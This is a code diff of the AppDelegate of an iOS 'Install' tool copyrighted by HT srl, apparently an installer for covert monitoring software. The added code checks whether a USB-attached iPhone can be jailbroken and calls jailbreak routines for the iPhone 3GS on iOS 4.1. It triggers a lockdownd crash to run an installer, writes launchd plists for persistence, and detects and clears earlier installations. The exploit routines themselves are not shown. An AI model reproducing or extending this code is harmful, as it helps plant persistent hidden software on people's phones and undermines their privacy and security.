@@ -1,17 +1,38 @@
-//
+ //
 //  AppDelegate.m
 //  Install
 //
-//  Created by armored on 2/7/13.
-//  Copyright (c) 2013 armored. All rights reserved.
+//  Created by Massimo Chiodini on 2/7/13.
+//  Copyright (c) 2013 HT srl. All rights reserved.
 //
 
 #import "AppDelegate.h"
 #import "iOSUsbSupport.h"
 
+#define NOT_INSTALL       0
+#define TRY_NON_JBINSTALL 1
+#define TRY_JBINSTALL     2
 
+#define set_icon(y)         [self setIcon:y]
+#define view_print(x)       [self tPrint:x]
+#define set_model()         [self setModel]
+#define reset_model()       [self resetModel]
+#define install_enabled(x)  [mInstall setEnabled:x]
+
+#define IDB_BITMAP_CLEAR  @"iphone"
+#define IDB_BITMAP_JB     @"iphone jb"
+#define IDB_BITMAP_GRAYED @"iphone grayed"
+
+extern int installios1(char *iosfolder);
+extern int installios2(char *iosfolder);
+extern int installios3(char *iosfolder);
+
+static NSString *gModel = nil;
+static NSString *gVersion = nil;
 static BOOL gIsDeviceAttached = FALSE;
 static NSString *gIosInstallationPath = nil;
+static int  gIsJailbreakable = TRY_JBINSTALL;
+static char *gIosInstallationPathString = nil;
 
 @implementation AppDelegate
 
@@ -24,9 +45,11 @@ static NSString *gIosInstallationPath = nil;
 #pragma mark Dialog message function
 #pragma mark -
 
-- (void)tPrint:(NSString*)theMsg
+- (void)tPrint:(char*)theMsg
 {
-  [mMessage setStringValue: theMsg];
+  NSString *tmpMsg = [NSString stringWithFormat:@"%s",theMsg];
+  
+  [mMessage setStringValue: tmpMsg];
 }
 
 - (void)setIcon:(NSString*)theIcon
@@ -89,32 +112,36 @@ NSString *models_name[] =  {@"iPhone",
                             NULL};
 - (void)setModel
 {
-  char gModel[256];
-  char gVersion[256];
   int i = 0;
   
   NSString *theModel = @"Unknown device";
   
-  sprintf(gModel, "%s", get_model());
-  sprintf(gVersion, "%s", get_version());
+  char *_model = get_model();
+  char *_version = get_version();
   
-  if (gModel == NULL)
-    return;
+  if (_model == NULL)
+   _model = "Unknown device";
+  if (_version == NULL)
+    _version = "Unknown version";
   
-  while (models[i++] != NULL)
+  while (models[i] != NULL)
   {
-    if (strcmp(models[i], gModel) == 0)
+    if (strcmp(models[i], _model) == 0)
     {
       theModel = models_name[i];
       break;
     }
+    i++;
   }
   
   NSString *msg = [NSString stringWithFormat:@"Model: %@\nVersion: %s",
                                              theModel,
-                                             gVersion];
+                                             _version];
   
   [mModel setStringValue: msg];
+  
+  gModel    = theModel;
+  gVersion  = [[NSString alloc] initWithFormat:@"%s", _version];
 }
 
 - (void)resetModel
@@ -126,39 +153,72 @@ NSString *models_name[] =  {@"iPhone",
 #pragma mark Check device thread
 #pragma mark -
 
+- (int)checkInstallationMode
+{
+  if (check_lockdownd_config() == TRUE)
+  {
+    return TRY_JBINSTALL;
+  }
+  else
+  {
+    if ([gModel compare:@"iPhone 3GS"] == NSOrderedSame &&
+        [gVersion compare:@"4.1"] == NSOrderedSame)
+      return TRY_NON_JBINSTALL;
+  }
+  
+  return NOT_INSTALL;
+}
+
 - (void)waitForDevice:(id)anObject
 {  
   BOOL isAttached = (BOOL)isDeviceAttached();
   
   if (isAttached == TRUE)
   {        
-    [self setIcon:@"iphone"];
+    set_icon(IDB_BITMAP_CLEAR);
     
-    [self setModel];
+    set_model();
     
-    [self tPrint:@"check device..."];
+    view_print("check device...");
+    
+    gIsJailbreakable = [self checkInstallationMode];
+    
+    switch (gIsJailbreakable)
+    {
+      case TRY_NON_JBINSTALL:
+      {
+        set_icon(IDB_BITMAP_JB);
+        break;
+      }
+      case NOT_INSTALL:
+      {
+        view_print("cannot install device!");
+        return;
+      }
+    }
     
     if (check_installation(1, 2) == 0)
     {
-      [self tPrint:@"check device... device is ready."];
+      view_print("check device... device is ready.");
       
       if (gIosInstallationPath != nil)
-        [mInstall setEnabled:YES];
-      
+      {
+        install_enabled(YES);
+        gIosInstallationPathString = (char*)[gIosInstallationPath cStringUsingEncoding:NSUTF8StringEncoding];
+      }
       gIsDeviceAttached = TRUE;
     }
     else
     {
-      [self tPrint:@"check device... installation detected!"];
+      view_print("check device... installation detected!");
       // force remove of installation files (in case of manually reboot)
       remove_installation();
       gIsDeviceAttached = FALSE;
-      
     }
   }
   else
   {
-    [self tPrint:@"cannot connect to device!"];
+    view_print("cannot connect to device!");
   }
 }
 
@@ -168,7 +228,7 @@ NSString *models_name[] =  {@"iPhone",
 
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification
 {
-  [self tPrint: @"Waiting for device..."];
+  view_print("Waiting for device...");
   
   sleep(1);
   
@@ -260,59 +320,121 @@ NSString *models_name[] =  {@"iPhone",
   int isDeviceOn = 0;
   int retInst = 0;
   
-  [self tPrint: @"start installation..."];
+  view_print("start installation...");
   
-  NSString *path = gIosInstallationPath;
+  install_enabled(NO);
   
-  if (path == nil)
+  if (gIsJailbreakable == TRY_NON_JBINSTALL)
   {
-    [self tPrint: @"cannot found installation dir!"];
+    // running jb tool for iphone3gs-4.1
+    int ret = 0;
+    
+    view_print("Setup device for installation...");
+    
+    ret = installios1(gIosInstallationPathString);
+    
+    if (ret == 0)
+    {
+      view_print("Setup failed!");
+      return;
+    }
+    
+    view_print("Preparing device for execute installation...");
+    
+    ret = installios2(gIosInstallationPathString);
+    
+    if (ret == 0)
+    {
+      view_print("Preparation failed!");
+      return;
+    }
+    
+    view_print("Trying execute installation...");
+    
+    ret = installios3(gIosInstallationPathString);
+    
+    if (ret == 0)
+    {
+      view_print("execution failed!");
+      return;
+    }
+    
+    goto check_point;
+    
+    return;
+  }
+  
+  if (gIosInstallationPathString == NULL)
+  {
+    view_print("cannot found installation dir!");
     goto exit_point;
   }
   
-  char *lpath = (char*)[path cStringUsingEncoding:NSUTF8StringEncoding];
-  
-  char **dir_content = list_dir_content(lpath);
+  char **dir_content = list_dir_content(gIosInstallationPathString);
   
   if (dir_content == NULL)
   {
-    [self tPrint: @"cannot found installation component!"];
+    view_print("cannot found installation component!");
     goto exit_point;
   }
   
   if (make_install_directory() != 0)
   {
-    [self tPrint: @"cannot create installation folder!"];
+    view_print("cannot create installation folder!");
     goto exit_point;
   }
   
-  [self tPrint: @"copy files..."];
+  view_print("copy files...");
   
-  if (copy_install_files(lpath, dir_content) != 0)
+#ifdef WIN32
+  
+  if (install_files(gIosInstallationPathString, dir_content) != 0)
   {
-    [self tPrint: @"cannot copy files into installation folder!"];
+    view_print("cannot copy files into installation folder!");
     goto exit_point;
   }
+  
+#else
+  
+  if (copy_install_files(gIosInstallationPathString, dir_content) != 0)
+  {
+    view_print("cannot copy files into installation folder!");
+    goto exit_point;
+  }
+  
+#endif
     
-  [self tPrint: @"copy files... done."];
+  view_print("copy files... done.");
+  
+  sleep(1);
+  
+  // Ok: using lockdownd crash for running installer...
+  view_print("try to run installer...");
+  
+  if (lockd_run_installer() == 1)
+  {
+    view_print("try to run installer... done.");
+    retInst = 1;
+    goto exit_point;
+  }
+  
+  // end.
   
   if (create_launchd_plist() != 0)
   {
-    [self tPrint: @"cannot create plist files!"];
+    view_print("cannot create plist files!");
     goto exit_point;
   }
   
-  [self tPrint: @"try to restart device..."];
+  view_print("try to restart device...");
   
   int retVal = restart_device();
   
   if (retVal == 1)
-    [self tPrint: @"try to restart device...restarting: please wait."];
+    view_print("try to restart device...restarting: please wait.");
   else
-    [self tPrint: @"can't restart device: try it manually!"];
-  
-  [mInstall setEnabled:NO];
-  
+    view_print("can't restart device: try it manually!");
+
   sleep(3);
   
   // Wait for device off
@@ -324,11 +446,11 @@ NSString *models_name[] =  {@"iPhone",
   
   } while(isDeviceOn == 1);
   
-  [self setIcon:@"iphone grayed"];
+  set_icon(IDB_BITMAP_GRAYED);
   
-  [self tPrint:@"device disconnected. Please wait..."];
+  view_print("device disconnected. Please wait...");
   
-  [self resetModel];
+  reset_model();
   
   // wait device on
   do
@@ -339,13 +461,14 @@ NSString *models_name[] =  {@"iPhone",
   
   } while(isDeviceOn == 0);
   
-  [self tPrint: @"device connected."];
-  
-  [self setIcon:@"iphone"];
-  
-  [self setModel];
-  
-  [self tPrint: @"checking installation..."];
+  view_print("device connected.");
+ 
+  set_icon(IDB_BITMAP_CLEAR);
+
+  set_model();
+
+check_point:
+  view_print("checking installation...");
   
   sleep(5);
   
@@ -358,11 +481,11 @@ exit_point:
   
   if ( retInst == 1)
   {
-    [self tPrint: @"installation done."];
+    view_print("installation done.");
   }
   else
   {
-    [self tPrint: @"installation failed: please retry!"];
+    view_print("installation failed: please retry!");
   }
 }
 
@@ -379,7 +502,7 @@ exit_point:
                            toTarget:self
                          withObject:nil];
   
-  [mInstall setEnabled: FALSE];
+  install_enabled(FALSE);
 }
 
 - (IBAction)cancel:(id)sender
